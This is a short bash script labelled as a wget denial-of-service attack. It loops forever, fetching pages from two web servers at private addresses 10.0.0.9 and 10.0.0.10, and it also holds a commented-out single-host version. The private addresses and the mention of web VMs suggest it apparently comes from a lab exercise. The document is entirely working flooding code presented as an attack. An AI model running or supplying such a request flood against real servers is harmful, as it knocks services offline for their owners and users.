#! /bin/bash
##WGET Attack- DoS
##send wget commands to Web VMs


#### Single command to infinitely loop wget command to 10.0.0.9
###while [ true ]; do wget -O /dev/null 10.0.0.9; done


###Nested Loop to perform wget to each Web VMs


while [ true ];
do 
	wget -O /dev/null 10.0.0.9
    wget -O /dev/null 10.0.0.10

done